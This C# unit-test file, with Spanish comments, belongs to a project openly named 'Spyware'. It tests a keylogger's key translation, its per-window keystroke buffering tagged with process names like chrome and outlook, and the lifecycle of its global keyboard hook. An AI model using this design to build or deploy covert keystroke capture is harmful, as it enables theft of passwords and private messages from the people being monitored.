using Spyware.Collectors.Keyboard;
using Xunit;

namespace Spyware.UnitTests;

/// <summary>
/// Traducción de teclas y agrupación en ráfagas. Las teclas sin glifo se comprueban sin
/// depender de la API de teclado (van por tabla); la letra se comprueba de forma tolerante
/// porque el glifo real lo decide el reparto de teclado de la máquina.
/// </summary>
public sealed class KeyboardTests
{
    private const int VkControl = 0x11;
    private const int VkLeft = 0x25;
    private const int VkReturn = 0x0D;

    [Theory]
    [InlineData(0xA0)]   // Mayús izquierdo
    [InlineData(0xA3)]   // Ctrl derecho
    [InlineData(0xA4)]   // Alt izquierdo
    [InlineData(0x5B)]   // Tecla Windows
    [InlineData(0x14)]   // Bloq Mayús
    public void Traduce_LasTeclasModificadoras_NoGeneranEvento(int virtualKey)
    {
        KeyTranslation translation = KeyTranslator.Translate(virtualKey, 0, 0, true);

        Assert.True(translation.IsModifier);
        Assert.False(translation.ProducesSomething);
    }

    [Theory]
    [InlineData(0x0D, "[enter]")]
    [InlineData(0x09, "[tab]")]
    [InlineData(0x1B, "[esc]")]
    [InlineData(VkLeft, "[izq]")]
    [InlineData(0x24, "[inicio]")]
    [InlineData(0x70, "[f1]")]
    [InlineData(0x87, "[f24]")]
    public void Traduce_LasTeclasSinGlifo_ComoMarcadorLegible(int virtualKey, string expected)
    {
        Assert.Equal(expected, KeyTranslator.Translate(virtualKey, 0, 0, true).Token);

        // Con recordSpecialKeys = false la tecla se ignora, no se inventa un carácter.
        Assert.Equal(string.Empty, KeyTranslator.Translate(virtualKey, 0, 0, false).Token);
    }

    [Fact]
    public void Traduce_ElEspacio_SaleComoCaracterReal() =>
        Assert.Equal(" ", KeyTranslator.Translate(0x20, 0x39, 0, true).Text);

    [Fact]
    public void Traduce_ElRetroceso_VaAparteParaQueElServicioDecida()
    {
        KeyTranslation withToken = KeyTranslator.Translate(0x08, 0x0E, 0, true);
        KeyTranslation withoutToken = KeyTranslator.Translate(0x08, 0x0E, 0, false);

        Assert.True(withToken.IsBackspace);
        Assert.Equal("[back]", withToken.Token);

        // El retroceso se señala siempre: lo que cambia es si se anota o borra el carácter.
        Assert.True(withoutToken.IsBackspace);
        Assert.Equal(string.Empty, withoutToken.Token);
    }

    [Fact]
    public void Traduce_UnaLetra_NoInventaNadaCuandoElTecladoNoEstaDisponible()
    {
        // El glifo exacto lo decide el reparto de la máquina y requiere sesión interactiva:
        // en una consola de servicio ToUnicodeEx puede no devolver nada. Lo que no puede
        // pasar es que se fabrique un marcador en lugar del carácter.
        KeyTranslation translation = KeyTranslator.Translate(0x41, 0x1E, 0, true);

        if (translation.Text.Length > 0)
        {
            Assert.InRange(translation.Text.Length, 1, 2);
            Assert.All(translation.Text.ToCharArray(), character => Assert.False(char.IsControl(character)));
        }
        else
        {
            Assert.True(translation.Token.Length == 0 || translation.Token.StartsWith('['));
        }
    }

    [Fact]
    public void Traduce_LosBanderinesNoCambianElMarcadorDeLasTeclasSinGlifo()
    {
        // F5 con Alt pulsado (banderín LLKHF_ALTDOWN): sigue siendo [f5].
        Assert.Equal("[f5]", KeyTranslator.Translate(0x74, 0x3F, 0x20, true).Token);
        Assert.Equal("[f5]", KeyTranslator.Translate(0x74, 0x3F, 0x01, true).Token);
    }

    [Fact]
    public void Marcadores_DePausa_TienenFormaLegible()
    {
        Assert.Equal("[pausa 45s]", KeyTranslator.Separator(45));
        Assert.Equal(string.Empty, KeyTranslator.Separator(0));
    }

    [Fact]
    public void Rafaga_AcumulaTextoYCierraAlLlenarse()
    {
        var burst = new KeylogBurst(new WindowInfo(new IntPtr(1), "Consola", "pwsh"), DateTime.UtcNow);

        burst.RegisterKey(DateTime.UtcNow);

        Assert.True(burst.Append("hola", 8));
        Assert.Equal("hola", burst.Text);
        Assert.False(burst.Overflowed);

        // No cabe " mundo" entero: entra lo que queda y la ráfaga se da por llena.
        Assert.False(burst.Append(" mundo", 8));
        Assert.Equal("hola mun", burst.Text);
        Assert.True(burst.Overflowed);
        Assert.Equal(1, burst.KeyCount);
    }

    [Fact]
    public void Rafaga_ElRetrocesoBorraElUltimoCaracter()
    {
        var burst = new KeylogBurst(WindowInfo.Unknown, DateTime.UtcNow);

        burst.Append("clave", 100);
        burst.Backspace();

        Assert.Equal("clav", burst.Text);

        burst.Backspace();
        burst.Backspace();
        burst.Backspace();
        burst.Backspace();
        burst.Backspace();

        Assert.Equal(string.Empty, burst.Text);
    }

    [Fact]
    public void Rafaga_InsertaMarcadorDePausaSoloTrasEsperar()
    {
        DateTime start = new(2026, 10, 24, 10, 0, 0, DateTimeKind.Utc);
        var burst = new KeylogBurst(WindowInfo.Unknown, start);

        Assert.True(burst.Append("a", 100));

        // 3 s después: todavía dentro de la misma ráfaga, sin separador.
        Assert.True(burst.AppendGap(start.AddSeconds(3), 30, 100));
        Assert.Equal("a", burst.Text);

        // 90 s después: se anota la pausa para no perder el orden temporal.
        Assert.True(burst.AppendGap(start.AddSeconds(93), 30, 1_000));
        Assert.Equal("a[pausa 93s]", burst.Text);
    }

    [Fact]
    public void Rafaga_DetectaPausaYUnaVentanaNoSeMezclaConOtra()
    {
        DateTime start = new(2026, 10, 24, 10, 0, 0, DateTimeKind.Utc);
        var first = new WindowInfo(new IntPtr(10), "Navegador", "chrome");
        var second = new WindowInfo(new IntPtr(20), "Correo", "outlook");

        var burst = new KeylogBurst(first, start);

        Assert.True(burst.IsSameWindowAs(new IntPtr(10)));
        Assert.False(burst.IsSameWindowAs(new IntPtr(20)), "otra ventana abre una ráfaga nueva");
        Assert.False(burst.IsIdle(start.AddMilliseconds(900), 1500));
        Assert.True(burst.IsIdle(start.AddMilliseconds(1600), 1500));

        // El servicio cierra la ráfaga al cambiar de foco: la ventana nueva es otra ráfaga.
        var moved = new KeylogBurst(second, start.AddSeconds(4));

        Assert.True(moved.IsSameWindowAs(new IntPtr(20)));
        Assert.Equal("outlook", moved.Window.ProcessName);
        Assert.False(moved.IsIdle(start.AddSeconds(3), 1500));
        Assert.True(burst.IsIdle(start.AddSeconds(3), 1500), "la ráfaga anterior sigue con su pausa");
    }

    [Fact]
    public void Hook_CicloDeVida_NoLanzaYElEstadoDelAltaSeConoce()
    {
        using var hook = new KeylogHook();

        hook.Start();

        // El hook puede no poder instalarse en una sesión sin escritorio (servicio, RDP
        // desconectado) o con el hilo de la bomba aún arrancando; lo que no puede pasar es
        // que el ciclo de vida lance ni que el estado del alta sea desconocido.
        Assert.True(hook.IsInstalled || hook.InstallFailure is not null || hook.PendingInstall,
            hook.Describe());

        hook.Stop();
        hook.Stop();

        Assert.False(hook.IsInstalled);
        Assert.False(hook.PendingInstall);
    }

    [Fact]
    public void Hook_LaColaVaPorOrdenYDescartaAlLlegarAlTecho()
    {
        using var hook = new KeylogHook();
        var instant = new DateTime(2026, 10, 24, 12, 0, 0, DateTimeKind.Utc);

        // Sin Start no hay hook del sistema: la cola se prueba sola, con pulsaciones inyectadas.
        hook.Enqueue(new RawKey(0x0D, 0x1C, 0, instant));
        hook.Enqueue(new RawKey(0x09, 0x0F, 0, instant.AddMilliseconds(5)));

        Assert.True(hook.TryDequeue(out RawKey first));
        Assert.Equal(0x0D, first.VirtualKey);
        Assert.Equal(instant, first.TimestampUtc);

        Assert.True(hook.TryDequeue(out RawKey second));
        Assert.Equal(0x09, second.VirtualKey);

        Assert.False(hook.TryDequeue(out _));

        for (int index = 0; index < KeyboardLimit.MaxQueuedKeys + 5; index++)
            hook.Enqueue(new RawKey(0x20, 0x39, 0, instant));

        Assert.True(hook.DroppedCount > 0);

        hook.ResetDropped();
        Assert.Equal(0, hook.DroppedCount);
    }
}
